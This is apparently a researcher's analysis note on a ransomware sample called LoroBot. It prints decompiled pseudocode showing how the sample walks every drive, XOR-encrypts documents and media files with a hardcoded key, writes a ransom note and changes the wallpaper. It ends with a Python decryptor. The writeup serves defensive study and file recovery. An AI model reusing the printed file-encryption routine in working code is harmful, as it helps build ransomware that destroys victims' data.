# [Quick Note] Pseudo code sample fec60c1e5fbff580d5391bba5dfb161a

# Overview
MD5: fec60c1e5fbff580d5391bba5dfb161a </br>
Any-run: https://app.any.run/tasks/06932a0e-b6e3-4f41-8b51-0f6ee5259bfa/ </br>

This malware sample called with name LoroBot Ransomeware. This is type Ransomeware encryted files on victim without the extension, and automatically restores some damaged files.

As on wallpaper of malware, can see notify the files are encrypted with 256-bit AES encryption. But this malware using XOR cipher techniques to encrypted data files.

# Start functions
With start function, this created files with name ```CryptLogFile.txt``` from file ```1:\Ïðî÷òè Ìåíÿ - êàê ðàñøèôðîâàòü ôàéëû.txt``` of malware. And call two functions ```f_set_desk_wallpaper()``` and ```f_find_and_encrypted_files()```.
```
void __noreturn start()
{

  lpBuffer = GlobalAlloc(0x40u, 0x200000u);
  GetWindowsDirectoryA(&FileName, 0x200u);      // This function is provided primarily for compatibility with legacy applications. New applications should store code in the Program Files folder and persistent data in the Application Data folder in the user's profile.
  lstrcatA(&FileName, aCryptlogfileTx);         // Appends one string to another. - with \\CryptLogFile.txt
  File = FileName;                              // File: 1:\Ïðî÷òè Ìåíÿ - êàê ðàñøèôðîâàòü ôàéëû.txt
  v0 = GetCommandLineA();                       // Retrieves the command-line string for the current process.
  for ( i = byte_403F28; ; ++i )
  {
    do
      v2 = *v0++;
    while ( v2 == 34 );
    if ( !v2 )
      break;
    *i = v2;
  }
  f_set_desk_wallpaper();
  hFile = CreateFileA(&FileName, 0x40000000u, 2u, 0, 1u, 0, 0);
  if ( hFile == (HANDLE)-1 )
  {
    v3 = lstrlenA(String);
    v4 = lstrlenA(byte_403F28);                 // rafgapnkucmghgklmgtiftqgtswqtrim
    if ( lstrcmpiA(&byte_403F28[v4 - v3], String) )// compare two lpString with lpString1
                                                // lpString: rafgapnkucmghgklmgtiftqgtswqtrim
                                                // lpString1: rafgapnkucmghgklmgtiftqgtswqtrim
      goto LABEL_14;
    f_generate_notify_files();
  }
  SetErrorMode(1u);                             // Controls whether the system will handle the specified types of serious errors or whether the process will handle them.
                                                // SEM_FAILCRITICALERRORS - 0x0001: The system does not display the critical-error-handler message box. Instead, the system sends the error to the calling process.
  v5 = GetLogicalDrives();                      // If the function succeeds, the return value is a bitmask representing the currently available disk drives. Bit position 0 (the least-significant bit) is drive A, bit position 1 is drive B, bit position 2 is drive C, and so on.
  v6 = 25;
  do
  {
    if ( v5 & (1 << v6) )
    {
      LOBYTE(v6) = v6 + 65;
      BYTE1(dword_403327) = v6;
      LOBYTE(v6) = v6 - 65;
      *(int *)((char *)&dword_403327 + 2) = 774528058;
      byte_40332D = 42;
      byte_40332E = 0;
      v7 = v5;
      v8 = v6;
      f_find_and_encrypted_files();
      v6 = v8;
      v5 = v7;
    }
    v9 = __OFSUB__(v6--, 1);
  }
  while ( !((v6 < 0) ^ v9) );
  hObject = CreateFileA(&File, 0x40000000u, 2u, 0, 2u, 0, 0);
  v10 = lstrlenA(aVeryBadNews);
  WriteFile(hObject, aVeryBadNews, v10, &NumberOfBytesWritten, 0);
  CloseHandle(hObject);
  ShellExecuteA(0, Operation, &File, 0, 0, 5);
  GlobalFree((HGLOBAL)lpBuffer);
  CloseHandle(hFile);
LABEL_14:
  ExitProcess(0);
}
```

# Function f_set_desk_wallpaper()
This function using ```GetEnvironmentVariableA``` to collect environment variable of victim machine with the name of the environment variable is ```TMP``` and value of this variable is ```%USERPROFILE%\AppData\Local\Temp```. The name of files wallpaper is ```wallpaper.bmp``` and the pleace where store wallpaper file is ```%USERPROFILE%\AppData\Local\Temp\wallpaper.bmp``` because using ```lstrcatA``` to appends ```%USERPROFILE%\AppData\Local\Temp``` with ```wallpaper.bmp```. The end of function, it's call ```SystemParametersInfoA``` to update the user profile while setting a parameter and values will set is ```0x14 - SPI_SETDESKWALLPAPER``` with path is ```%USERPROFILE%\AppData\Local\Temp\wallpaper.bmp```. So new wallpaper will setup on desktop background of victim machine.
```
BOOL f_set_desk_wallpaper()
{
  v0 = CreateFileA(byte_403F28, 0x80000000, 1u, 0, 3u, 0, 0);// Creates or opens a file or I/O device. The most commonly used I/O devices are as follows: file, file stream, directory, physical disk, volume, console buffer, tape drive, communications resource, mailslot, and pipe
  if ( v0 == (HANDLE)-1 )
    JUMPOUT(&loc_4013F0);
  hFile = v0;
  lDistanceToMove = GetFileSize(v0, 0) - 4;     // Retrieves the size of the specified file, in bytes.
  SetFilePointer(hFile, lDistanceToMove, 0, 0); // Moves the file pointer of the specified file.
  ReadFile(hFile, &Buffer, 4u, &nNumberOfBytesToWrite, 0);// Reads data from the specified file or input/output (I/O) device. Reads occur at the position specified by the file pointer if supported by the device.
  if ( !nNumberOfBytesToWrite )
    JUMPOUT(&loc_4013F0);
  lpBuffer = GlobalAlloc(0x40u, Buffer);        // Allocates the specified number of bytes from the heap.
  SetFilePointer(hFile, lDistanceToMove - Buffer, 0, 0);
  ReadFile(hFile, lpBuffer, Buffer, &nNumberOfBytesToWrite, 0);
  if ( !nNumberOfBytesToWrite )
    JUMPOUT(&loc_4013F0);
  CloseHandle(hFile);
  GetEnvironmentVariableA(&aTmp[2], pvParam, 0x200u);// Retrieves the contents of the specified variable from the environment block of the calling process.
                                                // pvParam:  receives the contents of the specified environment variable as a null-terminated string. An environment variable has a maximum size limit of 32,767 characters, including the null-terminating character.
  lstrcatA(pvParam, aWallpaperBmp);             // Appends one string to another (with pvParam + \\wallpaper.bmp)
  DeleteFileA(pvParam);                         // Deletes an existing file.
  v1 = CreateFileA(pvParam, 0xC0000000, 3u, 0, 2u, 0, 0);
  if ( v1 == (HANDLE)-1 )
    JUMPOUT(&loc_4013F0);
  hFile = v1;
  WriteFile(v1, lpBuffer, Buffer, &nNumberOfBytesToWrite, 0);
  CloseHandle(hFile);
  return SystemParametersInfoA(0x14u, 0, pvParam, 2u);// Retrieves or sets the value of one of the system-wide parameters. This function can also update the user profile while setting a parameter.
                                                // 0x14 - SPI_SETDESKWALLPAPER
}
```
# Function f_find_and_encrypted_files()
Overview, this function using ```FindFileData``` to find file with extension ```.doc.xlsdocxxlsx.db.mp3.waw.jpgjpeg.txt.rtf.pdf.rar.zip``` and call function ```f_xor_byte_with_key``` to encrypted data of files.
```
char *f_find_and_encrypted_files()
{

  struct _WIN32_FIND_DATAA FindFileData; // [esp+0h] [ebp-144h]

  result = (char *)FindFirstFileA((LPCSTR)&dword_403327 + 1, &FindFileData) + 1;// Searches a directory for a file or subdirectory with a name that matches a specific name 
  if ( result )
  {
    *(_DWORD *)&FindFileData.cAlternateFileName[14] = result - 1;
    do
    {
      if ( FindFileData.dwFileAttributes & 0x10 )
      {
        if ( lstrcmpA(String1, FindFileData.cFileName) )
        {
          if ( lstrcmpA(asc_403002, FindFileData.cFileName) )
          {
            v1 = lstrlenA((LPCSTR)&dword_403327 + 1) - 3;
            *((_BYTE *)&dword_403327 + v1 + 1) = 0;
            lstrcatA((LPSTR)&dword_403327 + 1, FindFileData.cFileName);
            v2 = lstrlenA((LPCSTR)&dword_403327 + 1);
            *(int *)((char *)&dword_403327 + v2 + 1) = 707668572;
            byte_40332C[v2] = 0;
            f_find_and_encrypted_files();
            *(int *)((char *)&dword_403327 + v1) = 707668572;
            byte_40332B[v1] = 0;
          }
        }
      }
      else
      {
        v3 = lstrlenA(FindFileData.cFileName);
        *(_DWORD *)dword_404D41 = *(DWORD *)((char *)&FindFileData.dwReserved1 + v3);
        byte_404D45 = 0;
        v4 = dword_403091;
        while ( 1 )
        {
          v5 = aDocXlsdocxxlsx[v4 - 1];         // .doc.xlsdocxxlsx.db.mp3.waw.jpgjpeg.txt.rtf.pdf.rar.zip
          *(_DWORD *)String2 = v5;
          byte_404D4A = 0;
          if ( !(_BYTE)v5 )
          {
            LOBYTE(v5) = dword_404D41[0];
            *(_DWORD *)String2 = v5;
          }
          v6 = v3;
          v7 = lstrcmpiA(dword_404D41, String2) == 0;
          v3 = v6;
          if ( v7 )
            break;
          if ( !--v4 )
            goto LABEL_17;
        }
        v8 = lstrlenA((LPCSTR)&dword_403327 + 1);
        lstrcpynA(Buffer, (LPCSTR)&dword_403327 + 1, v8 - 2);
        lstrcatA(Buffer, FindFileData.cFileName);
        v9 = (char *)CreateFileA(Buffer, 0xC0000000, 3u, 0, 3u, 0, 0) + 1;
        if ( v9 )
        {
          hObject = v9 - 1;
          dword_404430 = GetFileSize(v9 - 1, 0);
          ReadFile(hObject, (LPVOID)lpBuffer, 0x200000u, &nNumberOfBytesToWrite, 0);
          if ( nNumberOfBytesToWrite )
          {
            f_xor_byte_with_key(nNumberOfBytesToWrite);
            SetFilePointer(hObject, 0, 0, 0);
            WriteFile(hObject, lpBuffer, nNumberOfBytesToWrite, &NumberOfBytesWritten, 0);
          }
          CloseHandle(hObject);
          v10 = lstrlenA(Buffer);
          WriteFile(hFile, Buffer, v10, &NumberOfBytesWritten, 0);
          WriteFile(hFile, aTmp, 2u, &NumberOfBytesWritten, 0);
        }
      }
LABEL_17:
      ;
    }
    while ( FindNextFileA(*(HANDLE *)&FindFileData.cAlternateFileName[14], &FindFileData) );
    result = (char *)FindClose(*(HANDLE *)&FindFileData.cAlternateFileName[14]);
  }
  return result;
}
```
```f_xor_byte_with_key``` function using technique xor ciphers to xor bytes of data file with key cipher. And the xor key is ```C9 93 6B CA DF BF C0 61 46 49 33 47 46 AE 8F CC```
```
int __usercall f_xor_byte_with_key@<eax>(unsigned int a1@<eax>)
{

  v1 = a1 >> 2;
  if ( a1 != 0x200000 )
    ++v1;
  v2 = (int *)lpBuffer;
  v3 = lpBuffer;
  v4 = 0;
  do
  {
    if ( v4 == 4 )
      v4 = 0;
    v5 = *v2;
    ++v2;
    result = dword_403060[v4] ^ v5;             // C9 93 6B CA DF BF C0 61 46 49 33 47 46 AE 8F CC
    *v3 = result;
    ++v3;
    ++v4;
    --v1;
  }
  while ( v1 );
  return result;
}
```

# Interested strings
```\\CryptLogFile.txt``` </br>
```1:\Ïðî÷òè Ìåíÿ - êàê ðàñøèôðîâàòü ôàéëû.txt``` </br>
```\\wallpaper.bmp``` </br>
```.doc.xlsdocxxlsx.db.mp3.waw.jpgjpeg.txt.rtf.pdf.rar.zip``` </br>

# Small python code to decrypted
```
#! /usr/bin/env python3
from itertools import cycle
import binascii
import argparse
import os

key = binascii.unhexlify("C9936BCADFBFC0614649334746AE8FCC")
key = bytearray(key)


def xor(data, key):
    return bytearray([a ^ b for (a, b) in zip(data, cycle(key))])

def main():
    parser = argparse.ArgumentParser(description="Data XOR")
    parser.add_argument('--file', dest="file", default=None, help="Input file", required=True)
    args = parser.parse_args()

    with open(args.file, 'rb') as fp:
        crypted_file = bytearray(fp.read())
        
    decrypted_file = xor(crypted_file, key)
    with open(args.file, 'wb') as fp:
        fp.write(decrypted_file)
if __name__ == "__main__":
    main()
```    